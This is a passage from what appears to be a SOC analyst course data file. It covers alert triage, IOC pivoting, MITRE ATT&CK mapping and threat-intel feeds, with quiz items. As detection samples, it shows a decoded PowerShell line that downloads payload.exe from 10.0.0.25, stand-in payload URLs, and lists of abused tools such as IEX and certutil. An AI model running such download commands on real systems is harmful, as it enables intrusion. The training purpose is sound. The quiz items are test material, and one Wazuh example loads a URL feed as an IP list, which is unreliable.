    +-- False Positive -> Close with documentation
    +-- Insufficient Data -> Request more logs
\`\`\`

### Severity-Based Escalation

| Severity | Response Time | Action |
|----------|--------------|--------|
| **Critical** | < 15 minutes | Page IR team, isolate systems |
| **High** | < 1 hour | Escalate to senior analyst |
| **Medium** | < 4 hours | Investigate and correlate |
| **Low** | < 24 hours | Review during business hours |
| **Informational** | No SLA | Log for trending |

### Common False Positive Patterns

| Alert Type | Known FP Pattern |
|------------|-----------------|
| Brute force | Service account password rotation script |
| Malicious process | Admin running legitimate pentest tools |
| Outbound C2 | CDN traffic (Akamai, Cloudflare IPs) |
| Credential dumping | Legitimate backup software accessing LSASS |
| Scheduled task | GPO-deployed tasks via schtasks |

:::warning
Never close an alert as false positive without documenting WHY.
:::

### Ticket Documentation Template

\`\`\`
Ticket ID: SOC-2024-001234
Alert: SSH Brute Force from 10.0.0.50
Severity: High
Analyst: junior_analyst_1

Triage Steps:
1. 847 failed logons from 10.0.0.50 in 10 minutes
2. VirusTotal: 12/89 engines flag as malicious
3. Target account (admin) confirmed real, not service account
4. No other traffic from this IP in firewall logs

Classification: True Positive
Escalation: Tier 2 at 14:32 UTC
Status: Resolved
\`\`\`

:::classwork
**Lab:** Triage 3 high-severity alerts from Wazuh dashboard. For each: TP or FP? Enrichment findings? Document in ticket format.
:::`,
        aiPrompt: '',
        labUrl: '',
        labTitle: '',
        interviewQuestion: 'Walk me through your alert triage process.',
        interviewAnswer: '1) Initial assessment: check known FP patterns, verify expected traffic. 2) Enrichment: WHOIS/GeoIP, VirusTotal, threat feeds. 3) Investigation: correlate alerts, check endpoint, build timeline. 4) Decision: escalate TP, close FP with documentation.',
        quiz: [
          { question: 'What is a False Positive?', options: ['Alert triggered but activity was not malicious', 'Malicious activity with no alert', 'Alert correctly identifying malicious activity', 'True negative incorrectly classified'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'False Positive = alert fires on benign activity.', certTags: ['SOC'] },
          { question: 'Maximum response time for Critical severity?', options: ['< 15 minutes', '< 1 hour', '< 4 hours', '< 24 hours'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'Critical alerts require immediate response under 15 minutes.', certTags: ['SOC'] },
          { question: 'Why document false positive closures?', options: ['Prevents future analysts from re-investigating same patterns', 'Required by compliance', 'SIEM auto-reopens unclosed alerts', 'Management reviews weekly'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'Documentation prevents wasted effort on repeated investigations.', certTags: ['SOC'] },
          { question: 'Which source checks if an IP is known malicious?', options: ['VirusTotal, AbuseIPDB, or OTX AlienVault', 'WHOIS only', 'Google search', 'Internal DNS records'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'VirusTotal aggregates 80+ AV engines; AbuseIPDB tracks reported malicious IPs.', certTags: ['SOC', 'Threat Intel'] },
          { question: 'Service account triggers brute force alert during nightly rotation. Classification?', options: ['False Positive - document account and script, create suppression rule', 'True Positive - script may be compromised', 'Escalate immediately', 'Close without investigation'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'Known service accounts performing expected actions are false positives.', certTags: ['SOC'] },
          { question: 'What comes after "Initial Assessment" in triage?', options: ['Enrichment - gather external context', 'Escalation - notify IR team', 'Containment - isolate system', 'Documentation - close ticket'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'Triage flow: Assessment -> Enrichment -> Investigation -> Decision.', certTags: ['SOC'] },
          { question: 'What is a False Negative?', options: ['Malicious activity occurred but no alert generated', 'Alert for benign activity', 'True positive incorrectly closed', 'Rule that never fires'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'False Negatives are the most dangerous - real attacks slip through undetected.', certTags: ['SOC', 'Detection'] },
          { question: 'What should a triage ticket include?', options: ['Alert details, triage steps, enrichment, classification, escalation status', 'Just alert name and closing note', 'Only source/destination IP', 'Analyst name and timestamp only'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'Complete documentation creates an audit trail.', certTags: ['SOC'] },
          { question: 'When should alerts be escalated to Tier 2/3?', options: ['Confirmed True Positive or scope exceeds Tier 1 capabilities', 'Every alert immediately', 'Only when analyst is unsure', 'After 24 hours open'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'Tier 1 escalates confirmed TPs or alerts needing deeper investigation.', certTags: ['SOC'] },
          { question: 'What is the difference between True Positive and True Negative?', options: ['TP = alert + malicious; TN = no alert + no malicious', 'TP = alert fired; TN = no alert', 'TP = high severity; TN = low severity', 'TP = escalated; TN = closed'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'Both are correct outcomes - the detection system worked as intended.', certTags: ['SOC'] },
          { question: 'Backup software accesses LSASS. Verified normal. How to handle?', options: ['FP - document process path, create whitelist rule for this process', 'Escalate to Tier 2', 'Block the backup software', 'Delete the alert'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'After verification, document and create detection exception for the specific process.', certTags: ['SOC'] },
          { question: 'What is "data source pivoting" in investigation?', options: ['Cross-referencing same event across SIEM, endpoint, network, cloud logs', 'Moving data between SIEMs', 'Switching dashboards', 'Exporting to spreadsheet'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'Pivoting searches all data sources for the same IOC to build a complete picture.', certTags: ['SOC', 'Investigation'] },
          { question: 'Why are False Negatives more dangerous than False Positives?', options: ['Real attacks occur without detection - no visibility', 'FPs generate more tickets', 'FNs are harder to document', 'FNs affect SIEM performance'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'FNs mean attackers operate undetected for extended periods.', certTags: ['SOC', 'Detection'] },
          { question: 'What does "Initial Assessment" in triage involve?', options: ['Check known FP patterns, verify expected traffic, assess severity-context alignment', 'Deep forensic analysis', 'Block related IPs', 'Send org-wide notification'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'Initial Assessment is the quick first look to determine if deeper investigation is needed.', certTags: ['SOC'] },
          { question: 'Analyst closes 50 alerts in 1 hour with no documentation. Risk?', options: ['Future analysts waste time re-investigating same patterns', 'SIEM flags analyst for inactivity', 'Alerts reappear automatically', 'No risk - closing FP is always correct'], correctAnswerIndex: 0, difficulty: 'advanced', explanation: 'Undocumented closures create tribal knowledge problems and miss detection tuning issues.', certTags: ['SOC'] }
        ]
      },
      {
        id: 'we38d02',
        title: 'Investigation Workflow & IOC Pivoting',
        description: 'Extract IOCs from alerts, enrich with threat intel, build timelines, and pivot across data sources',
        type: 'lab',
        duration: '4 hours',
        content: `:::objectives
- Extract IOCs from raw alerts
- Enrich IOCs using threat intelligence sources
- Build investigation timelines from multiple data sources
- Pivot from one IOC across SIEM, endpoint, and network logs
:::

### IOC Types

| IOC Type | Example | Where to Find |
|----------|---------|---------------|
| **IP Address** | 10.0.0.50 | Firewall, proxy, SIEM |
| **Domain** | evil-payload.com | DNS, proxy logs |
| **File Hash (SHA256)** | e3b0c44298fc1c14... | EDR, VirusTotal |
| **URL** | http://evil.com/payload.exe | Proxy, browser history |
| **Filename** | cobaltstrike.exe | Sysmon Event 1, 11 |
| **Registry Key** | HKLM\\...\\Run\\payload | Sysmon Event 13 |

### IOC Extraction Example

From a PowerShell download alert:

\`\`\`
Rule: 18104 - PowerShell encoded command
Extracted IOCs:
  1. Process: powershell.exe
  2. Flag: -enc (encoded command)
  3. Base64: JABjAGwAaQBlAG4AdAA...
  4. Decoded: $client.DownloadFile('http://10.0.0.25/payload.exe', 'C:\\temp\\payload.exe')
  5. URL: http://10.0.0.25/payload.exe
  6. File: C:\\temp\\payload.exe
  7. IP: 10.0.0.25
\`\`\`

### Enrichment Sources

\`\`\`bash
# VirusTotal
curl -X GET "https://www.virustotal.com/api/v3/ip_addresses/10.0.0.25" \
  -H "x-apikey: YOUR_KEY"

# AbuseIPDB
curl -G "https://api.abuseipdb.com/api/v2/check" \
  --data-urlencode "ipAddress=10.0.0.25" \
  -H "Key: YOUR_KEY" -H "Accept: application/json"
\`\`\`

### Timeline Analysis

\`\`\`
2024-06-15 09:14:22 | Event 4624 (Logon) | Source: 10.0.0.50 | User: admin | Type: 3
2024-06-15 09:14:45 | Event 4688 (Process) | powershell.exe -enc JABj...
2024-06-15 09:15:02 | Sysmon 11 (File) | C:\\temp\\payload.exe
2024-06-15 09:15:15 | Sysmon 1 (Process) | payload.exe -> cmd.exe
2024-06-15 09:15:18 | Sysmon 3 (Network) | payload.exe -> 10.0.0.25:443
2024-06-15 09:15:30 | Sysmon 13 (Registry) | HKLM\\...\\Run\\payload
\`\`\`

### Data Source Pivoting

Starting from IOC 10.0.0.50:

\`\`\`
Pivot 1: SIEM -> All alerts from 10.0.0.50
Pivot 2: Firewall -> All connections to/from 10.0.0.50
Pivot 3: DNS -> All queries resolving to 10.0.0.50
Pivot 4: Proxy -> All HTTP requests to 10.0.0.50
Pivot 5: Endpoint -> Any process communicating with 10.0.0.50
\`\`\`

:::classwork
**Lab:** You receive this alert: "Suspicious process C:\\Windows\\Temp\\update.exe spawned by w3wp.exe, command: update.exe -s 10.0.0.25 -p 443 -d". Extract IOCs, enrich IP, build timeline, pivot across sources, document in ticket.
:::`,
        aiPrompt: '',
        labUrl: '',
        labTitle: '',
        interviewQuestion: 'An alert fires for a suspicious process on a web server. Walk through your investigation.',
        interviewAnswer: '1) Extract IOCs: source IP, process, command line, file hash. 2) Enrich: VirusTotal, AbuseIPDB, hash lookups. 3) Build timeline: events before/after. 4) Pivot: search firewall, DNS, proxy, endpoints for same IOCs. 5) Document and classify.',
        quiz: [
          { question: 'Which IOC type is extracted from DNS logs showing "evil-payload.com"?', options: ['Domain', 'IP Address', 'File Hash', 'URL'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'DNS logs contain domain queries.', certTags: ['SOC', 'Investigation'] },
          { question: 'What is pivoting across data sources?', options: ['Taking one IOC and searching across SIEM, firewall, DNS, proxy, endpoint logs', 'Moving between SIEM dashboards', 'Switching analyst roles', 'Exporting data formats'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'Pivoting uses a single IOC to search all data sources.', certTags: ['SOC', 'Investigation'] },
          { question: 'Why decode base64 PowerShell commands?', options: ['-enc hides the actual command - decoding reveals malicious URLs/actions', 'Improves SIEM performance', 'Encoded commands are always benign', 'Base64 is encryption not obfuscation'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'Attackers use -enc to hide commands from basic detection.', certTags: ['SOC', 'PowerShell'] },
          { question: 'Correct order for building an investigation timeline?', options: ['Chronological earliest to latest across all data sources', 'By alert severity', 'By data source priority', 'Reverse chronological'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'Timelines must be chronological to understand the attack chain.', certTags: ['SOC', 'Investigation'] },
          { question: 'Which Sysmon Event ID finds a file dropped by malware?', options: ['Event 11 (File Create)', 'Event 1 (Process Creation)', 'Event 3 (Network Connection)', 'Event 7 (Image Loaded)'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'Sysmon Event 11 records file creation events.', certTags: ['SOC', 'Sysmon'] },
          { question: 'What does AbuseIPDB provide about an IP?', options: ['Abuse score, reports, ISP info, country', 'Only owner name', 'Real-time traffic', 'Physical GPS coordinates'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'AbuseIPDB aggregates reports from security professionals worldwide.', certTags: ['SOC', 'Threat Intel'] },
          { question: 'w3wp.exe spawns cmd.exe running whoami. What does this indicate?', options: ['Web shell exploitation - attacker executing commands through web server', 'Normal IIS maintenance', 'Misconfigured app pool', 'Windows Update process'], correctAnswerIndex: 0, difficulty: 'advanced', explanation: 'IIS worker processes should never spawn cmd.exe - classic web shell indicator.', certTags: ['SOC', 'Web Security'] },
          { question: 'Which tool checks if a file hash is known malware?', options: ['VirusTotal (80+ AV engines)', 'WHOIS lookup', 'nslookup', 'traceroute'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'VirusTotal checks hashes against 80+ antivirus engines.', certTags: ['SOC', 'Threat Intel'] },
          { question: 'What is an IOC "chain"?', options: ['Sequence of related IOCs describing the attack path', 'Single IOC in multiple alerts', 'IOC in >10 alerts', 'Whitelisted IOC'], correctAnswerIndex: 0, difficulty: 'advanced', explanation: 'IOC chains connect related indicators: IP -> domain -> hash -> registry key.', certTags: ['SOC', 'Investigation'] },
          { question: 'Why preserve original alert data?', options: ['Needed for forensic integrity and legal proceedings', 'Makes SIEM faster', 'Frees dashboard space', 'Alerts auto-delete after 24 hours'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'Original data is evidence. Losing it compromises forensic integrity.', certTags: ['SOC', 'Forensics'] },
          { question: 'What does Sysmon Event 13 (Registry Value Set) indicate?', options: ['Registry modified - check for persistence (Run keys, services)', 'New user added', 'Network connection', 'File deleted'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'Registry modifications are common persistence techniques.', certTags: ['SOC', 'Sysmon'] },
          { question: 'Attacker downloaded tool from 10.0.0.25, dumped credentials. Which IOCs go on watchlist?', options: ['IP, file hash, registry key, C2 domain', 'Only the IP', 'Only the hash', 'None - investigation complete'], correctAnswerIndex: 0, difficulty: 'advanced', explanation: 'Comprehensive watchlists include all related indicators.', certTags: ['SOC', 'Threat Intel'] },
          { question: 'What is the difference between containment and eradication?', options: ['Containment stops spread; eradication removes attacker completely', 'They are the same', 'Containment for network; eradication for malware', 'Eradication before containment'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'Containment limits damage; eradication removes the threat completely.', certTags: ['SOC', 'Incident Response'] },
          { question: 'What does a complete investigation report include?', options: ['Timeline, IOCs, root cause, scope, containment, eradication, recommendations', 'Just alert details and classification', 'Only IOCs found', 'Analyst personal opinion'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'Reports document the full lifecycle from detection to recommendations.', certTags: ['SOC', 'Incident Response'] },
          { question: 'Same IP in DNS, firewall, and SIEM alerts from 3 endpoints. What does this suggest?', options: ['Coordinated attack or C2 infrastructure - larger scope', 'Coincidence - IPs are reused', 'Only SIEM alert matters', 'Firewall log is probably FP'], correctAnswerIndex: 0, difficulty: 'advanced', explanation: 'An IP across multiple sources indicates coordinated activity, likely C2.', certTags: ['SOC', 'Investigation'] }
        ]
      }
    ]
  },


  {
    id: 'week39',
    title: 'Threat Intelligence & MITRE ATT&CK',
    durationText: 'Week 39 (Days 1-2)',
    focus: 'Map adversary behavior to MITRE ATT&CK, consume threat intelligence, and operationalize IOCs',
    output: 'Ability to map detections to ATT&CK techniques, consume threat feeds, and understand the intelligence lifecycle',
    topics: [
      {
        id: 'we39d01',
        title: 'MITRE ATT&CK Framework',
        description: 'Navigate the ATT&CK matrix, map detected activity to techniques, and use the Navigator',
        type: 'learn',
        duration: '4 hours',
        content: `:::objectives
- Navigate the 14 ATT&CK tactics and their relationships
- Map real attack behaviors to specific techniques and sub-techniques
- Use the ATT&CK Navigator to visualize detection coverage
- Identify common techniques used in real-world attacks
:::

:::concept
MITRE ATT&CK is a knowledge base of adversary tactics and techniques based on real-world observations.
:::

### The 14 ATT&CK Tactics

| # | Tactic | Example Technique |
|---|--------|-------------------|
| 1 | **Reconnaissance** | T1595 - Active Scanning |
| 2 | **Resource Development** | T1583 - Acquire Infrastructure |
| 3 | **Initial Access** | T1566 - Phishing |
| 4 | **Execution** | T1059 - Command Interpreter |
| 5 | **Persistence** | T1053 - Scheduled Task |
| 6 | **Privilege Escalation** | T1068 - Exploitation for Priv Esc |
| 7 | **Defense Evasion** | T1027 - Obfuscated Files |
| 8 | **Credential Access** | T1003 - OS Credential Dumping |
| 9 | **Discovery** | T1087 - Account Discovery |
| 10 | **Lateral Movement** | T1021 - Remote Services |
| 11 | **Collection** | T1005 - Data from Local System |
| 12 | **Command and Control** | T1071 - Application Layer Protocol |
| 13 | **Exfiltration** | T1041 - Exfil Over C2 |
| 14 | **Impact** | T1486 - Data Encrypted (Ransomware) |

### Key Techniques

**T1566 - Phishing:**
\`\`\`
Detection: Email gateway (attachments .iso, .img, .vhd), endpoint (OUTLOOK.EXE -> cmd.exe)
\`\`\`

**T1059 - Command and Scripting Interpreter:**
\`\`\`
T1059.001 - PowerShell: -enc, IEX, Invoke-Expression
T1059.003 - cmd.exe: certutil, bitsadmin
T1059.005 - VBScript: cscript.exe, wscript.exe
Detection: Sysmon Event 1, Windows Event 4688, PowerShell ScriptBlock Logging
\`\`\`

**T1053 - Scheduled Task (Persistence):**
\`\`\`
Detection: Windows Event 4698, Sysmon Event 1 (schtasks /create)
\`\`\`

**T1021 - Remote Services (Lateral Movement):**
\`\`\`
T1021.001 - RDP: Logon Type 10
T1021.002 - SMB: net use, psexec
T1021.004 - SSH
Detection: Event 4624 Type 10, Event 5145, Sysmon Event 3
\`\`\`

### ATT&CK Navigator

1. Go to https://mitre-attack.github.io/attack-navigator/
2. Create a layer and color cells:
   - **Green** = Detection exists
   - **Yellow** = Partial detection
   - **Red** = No detection (gap)
   - **Gray** = Not applicable

### Common Attack Chains

**Ransomware (Conti-style):**
\`\`\`
T1566 -> T1059.001 -> T1003 -> T1021.002 -> T1053 -> T1486 -> T1567
\`\`\`

:::classwork
**Lab:** Open ATT&CK Navigator, create a layer for your detection capabilities, color by coverage, identify top 3 gaps, write a Sigma rule for one gap.
:::`,
        aiPrompt: '',
        labUrl: '',
        labTitle: '',
        interviewQuestion: 'How do you map a specific attack behavior to an ATT&CK technique?',
        interviewAnswer: 'Identify the adversary goal (e.g., stealing credentials), find the corresponding tactic (Credential Access) and technique (T1003). This mapping ensures systematic detection coverage, reveals gaps, and enables comparison against threat actor profiles.',
        quiz: [
          { question: 'Which ATT&CK tactic includes "Phishing" (T1566)?', options: ['Initial Access', 'Execution', 'Persistence', 'Reconnaissance'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'Phishing is an Initial Access technique.', certTags: ['MITRE ATT&CK'] },
          { question: 'What is the difference between a tactic and a technique?', options: ['Tactics are goals (why), techniques are methods (how)', 'Same thing', 'Tactics for blue team, techniques for red', 'Techniques are broader'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'Tactics represent the goal; techniques represent the method.', certTags: ['MITRE ATT&CK'] },
          { question: 'Which technique covers PowerShell encoded commands?', options: ['T1059.001 - PowerShell', 'T1059.003 - cmd.exe', 'T1204 - User Execution', 'T1205 - Service Execution'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'T1059.001 specifically covers PowerShell scripting interpreter.', certTags: ['MITRE ATT&CK'] },
          { question: 'What does the ATT&CK Navigator visualize?', options: ['Detection coverage across the ATT&CK matrix', 'Geographic attacker locations', 'Network topology', 'SIEM log rates'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'The Navigator layers detection capabilities over the ATT&CK matrix.', certTags: ['MITRE ATT&CK'] },
          { question: 'T1021.001 corresponds to which lateral movement method?', options: ['RDP', 'SMB', 'SSH', 'WMI'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'T1021.001 is Remote Desktop Protocol.', certTags: ['MITRE ATT&CK'] },
          { question: 'Which tactic covers "Data Encrypted for Impact" (T1486)?', options: ['Impact', 'Exfiltration', 'Collection', 'Defense Evasion'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'T1486 is ransomware encryption under the Impact tactic.', certTags: ['MITRE ATT&CK'] },
          { question: 'What does "Defense Evasion" (TA0005) cover?', options: ['Techniques to avoid detection - obfuscation, disabling defenses, injection', 'Credential stealing', 'Lateral movement', 'Persistence'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'Defense Evasion includes T1027 (Obfuscation), T1562 (Impair Defenses), T1055 (Injection).', certTags: ['MITRE ATT&CK'] },
          { question: 'In a ransomware chain, which technique comes FIRST?', options: ['T1566 (Phishing) - initial access', 'T1486 (Encryption) - impact', 'T1003 (Credential Dump)', 'T1021 (Lateral Movement)'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'The kill chain begins with Initial Access (Phishing).', certTags: ['MITRE ATT&CK', 'Ransomware'] },
          { question: 'Which technique does Windows Event 4698 detect?', options: ['T1053 (Scheduled Task) - task creation', 'T1059 (Command Interpreter)', 'T1003 (Credential Dump)', 'T1486 (Data Encrypted)'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'Event 4698 records Scheduled Task creation.', certTags: ['MITRE ATT&CK', 'Windows'] },
          { question: 'Which sub-technique of T1003 dumps LSASS memory?', options: ['T1003.001 - LSASS Memory', 'T1003.002 - SAM', 'T1003.003 - NTDS', 'T1003.006 - DCSync'], correctAnswerIndex: 0, difficulty: 'advanced', explanation: 'T1003.001 specifically covers LSASS memory dumping.', certTags: ['MITRE ATT&CK', 'Credential Access'] },
          { question: 'What color represents partial detection in the Navigator?', options: ['Yellow', 'Green', 'Red', 'Blue'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'Green = full coverage, Yellow = partial, Red = gap.', certTags: ['MITRE ATT&CK'] },
          { question: 'Which tactic includes T1078 (Valid Accounts)?', options: ['Initial Access and Persistence', 'Credential Access only', 'Defense Evasion only', 'Lateral Movement only'], correctAnswerIndex: 0, difficulty: 'advanced', explanation: 'T1078 spans Initial Access, Persistence, Privilege Escalation, and Defense Evasion.', certTags: ['MITRE ATT&CK'] },
          { question: 'Why is ATT&CK important for SOC teams?', options: ['Common language for attacks, gap analysis, coverage measurement', 'Replaces SIEM tools', 'Only for red teams', 'Compliance framework like PCI-DSS'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'ATT&CK provides standardized vocabulary and helps identify detection gaps.', certTags: ['MITRE ATT&CK', 'SOC'] },
          { question: 'What is the difference between T1566.001 and T1566.002?', options: ['001 = malicious attachment; 002 = URL in email body', '001 = mass phishing; 002 = targeted', '001 = Windows; 002 = Linux', 'No difference'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'T1566.001 delivers via file attachment; T1566.002 via URL.', certTags: ['MITRE ATT&CK', 'Phishing'] },
          { question: 'Which technique covers creating a new user account for persistence?', options: ['T1136 - Create Account', 'T1098 - Account Manipulation', 'T1078 - Valid Accounts', 'T1531 - Account Access Removal'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'T1136 covers new account creation for persistence.', certTags: ['MITRE ATT&CK'] }
        ]
      },
      {
        id: 'we39d02',
        title: 'Threat Intelligence & IOC Operationalization',
        description: 'Understand TLP, consume threat feeds, use STIX/TAXII, and operationalize IOCs in detection',
        type: 'practice',
        duration: '4 hours',
        content: `:::objectives
- Apply Traffic Light Protocol (TLP)
- Use IOC types and formats (STIX/TAXII) in detection
- Consume threat feeds from OTX, abuse.ch, and VirusTotal
- Operationalize IOCs into Wazuh/Sigma detection rules
:::

### Traffic Light Protocol (TLP)

| TLP | Name | Sharing Scope |
|-----|------|---------------|
| **TLP:RED** | Restricted | Only within your organization |
| **TLP:AMBER** | Amber | Your org + clients with need-to-know |
| **TLP:GREEN** | Green | Within your community (ISACs) |
| **TLP:CLEAR** | Clear | Unrestricted — public sharing |

:::warning
Never share TLP:RED information outside your organization.
:::

### IOC Types

| Type | Example | Use In Detection |
|------|---------|------------------|
| IPv4 | 10.0.0.50 | Firewall blocks, SIEM watchlists |
| Domain | evil-payload.com | DNS blocklists |
| URL | http://evil.com/payload.exe | Proxy rules |
| File Hash (SHA256) | e3b0c44298fc... | EDR scanning |
| JA3 Hash | e7d705a3286e... | TLS fingerprint detection |

### STIX/TAXII

**STIX** is a format for encoding threat intel:

\`\`\`json
{
  "type": "indicator",
  "id": "indicator--a1b2c3d4-e5f6-7890-abcd-ef1234567890",
  "name": "Cobalt Strike C2 Server",
  "pattern": "[ipv4-addr:value = '10.0.0.50']",
  "confidence": 85
}
\`\`\`

**TAXII** is the protocol for sharing STIX data via HTTP/REST APIs.

### Threat Feed Sources

\`\`\`bash
# OTX AlienVault
curl -X GET "https://otx.alienvault.com/api/v1/indicators/IPv4/10.0.0.50/pulses" \
  -H "X-OTX-API-KEY: YOUR_KEY"

# ThreatFox (abuse.ch)
curl -X POST "https://threatfox-api.abuse.ch/api/v1/" \
  -d '{"query": "search_ioc", "search_term": "10.0.0.50"}'

# MalwareBazaar (abuse.ch)
curl -X POST "https://mb-api.abuse.ch/api/v1/" \
  -d '{"query": "get_info", "hash": "d41d8cd98f00b204e9800998ecf8427e"}'
\`\`\`

### Operationalizing IOCs in Wazuh

\`\`\`bash
# Download threat feed
curl -o /var/ossec/etc/lists/abusech-ip.txt \
  "https://urlhaus-api.abuse.ch/v1/urls/recent/100/"
\`\`\`

\`\`\`xml
<list>etc/lists/abusech-ip.txt</list>

<rule id="100300" level="10">
  <if_sid>5712</if_sid>
  <list field="srcip">etc/lists/abusech-ip.txt</list>
  <description>Connection from known malicious IP (abuse.ch)</description>
  <group>threat_intel,pci_dss_11.4</group>
</rule>
\`\`\`

### Intelligence Lifecycle

\`\`\`
Direction -> Collection -> Processing -> Analysis -> Dissemination -> Feedback
\`\`\`

:::classwork
**Lab:** Create OTX account, find a ransomware pulse, extract 5 IOCs, verify on VirusTotal, create Wazuh CDB list and rule.
:::`,
        aiPrompt: '',
        labUrl: '',
        labTitle: '',
        interviewQuestion: 'Explain TLP:AMBER vs TLP:GREEN.',
        interviewAnswer: 'TLP:AMBER restricts sharing to your org and specific clients. TLP:GREEN allows sharing within your community (ISACs, partners). AMBER is bilateral, GREEN is community-wide.',
        quiz: [
          { question: 'What does TLP:RED mean?', options: ['Share only within your org - need-to-know', 'Share with clients and partners', 'Share within industry group', 'Share publicly'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'TLP:RED is the most restrictive sharing level.', certTags: ['Threat Intel'] },
          { question: 'What is STIX?', options: ['Standardized format for encoding threat intel data', 'Protocol for real-time sharing', 'Firewall rule type', 'SIEM aggregation format'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'STIX is a language for describing threat intel in machine-readable format.', certTags: ['Threat Intel'] },
          { question: 'What protocol does TAXII use?', options: ['HTTP/REST API', 'SMTP', 'SNMP', 'FTP'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'TAXII uses RESTful HTTP APIs to share STIX objects.', certTags: ['Threat Intel'] },
          { question: 'Which feed provides malware hashes and samples?', options: ['MalwareBazaar (abuse.ch)', 'OTX AlienVault', 'AbuseIPDB', 'WHOIS'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'MalwareBazaar provides SHA256 hashes, file types, and tags.', certTags: ['Threat Intel'] },
          { question: 'Correct order of the Intelligence Lifecycle?', options: ['Direction -> Collection -> Processing -> Analysis -> Dissemination -> Feedback', 'Collection -> Direction -> Analysis -> Processing', 'Processing -> Collection -> Direction', 'Analysis -> Collection -> Processing -> Direction'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'The lifecycle starts with Direction (what questions need answering).', certTags: ['Threat Intel'] },
          { question: 'How do you operationalize IOCs in Wazuh?', options: ['Create CDB list and reference in detection rule via <list> tag', 'Paste IPs into <white_list>', 'Import CSV via dashboard', 'Wazuh cannot use external lists'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'Wazuh uses CDB lists referenced in rules via the <list> element.', certTags: ['Wazuh', 'Threat Intel'] },
          { question: 'What does a JA3 hash represent?', options: ['TLS client fingerprint - identifies application making connections', 'File hash', 'DNS query signature', 'Email header hash'], correctAnswerIndex: 0, difficulty: 'advanced', explanation: 'JA3 hashes TLS Client Hello fields to identify the client application.', certTags: ['Threat Intel', 'Network'] },
          { question: 'Which TLP level allows sharing within industry ISACs?', options: ['TLP:GREEN', 'TLP:AMBER', 'TLP:RED', 'TLP:CLEAR'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'TLP:GREEN permits community-wide sharing.', certTags: ['Threat Intel'] },
          { question: 'What is the difference between a threat feed and a pulse?', options: ['Feed = continuous IOC stream; pulse = single report grouping related IOCs', 'Same thing', 'Pulse = real-time API; feed = static file', 'Feed = IPs only; pulse = hashes only'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'A feed is ongoing; a pulse groups IOCs for a specific campaign.', certTags: ['Threat Intel'] },
          { question: 'What does "Direction" in the Intelligence Lifecycle involve?', options: ['Define what questions need answering based on threat landscape', 'Direct traffic to threat servers', 'Classify intel by direction', 'Point SIEM to threat feed'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'Direction is planning: what threats does the org face?', certTags: ['Threat Intel'] },
          { question: 'STIX confidence: 85 represents what level?', options: ['High confidence - likely accurate from multiple sources', 'Low - unverified', 'Medium - needs validation', 'Absolute certainty'], correctAnswerIndex: 0, difficulty: 'advanced', explanation: '85 is high confidence, based on multiple sources or direct observation.', certTags: ['Threat Intel', 'STIX'] },
          { question: 'Which abuse.ch service provides active C2 server IPs?', options: ['ThreatFox', 'MalwareBazaar', 'URLhaus', 'Feodo Tracker'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'ThreatFox provides IOCs for active malware C2 infrastructure.', certTags: ['Threat Intel'] },
          { question: 'What is the "diamond model" in threat intel?', options: ['Framework linking adversary, capability, infrastructure, victim', 'Encryption method', 'SIEM dashboard layout', 'IOC confidence scoring'], correctAnswerIndex: 0, difficulty: 'advanced', explanation: 'The Diamond Model maps four vertices: Adversary, Capability, Infrastructure, Victim.', certTags: ['Threat Intel'] },
          { question: 'Why age out old IOCs from detection lists?', options: ['Old IOCs become stale - infrastructure changes, IPs reassigned, cause FPs', 'Saves disk space', 'Old IOCs are always FP', 'SIEM performance degrades'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'Threat infrastructure changes frequently; stale IOCs match benign traffic.', certTags: ['Threat Intel'] },
          { question: 'How to verify a feed IOC is still active before blocking?', options: ['Cross-reference VirusTotal, check WHOIS expiry, test connectivity', 'Add immediately if in feed', 'Wait 30 days', 'Only use 7+ day old IOCs'], correctAnswerIndex: 0, difficulty: 'advanced', explanation: 'Verify IOCs through multiple sources to reduce false positives.', certTags: ['Threat Intel'] }
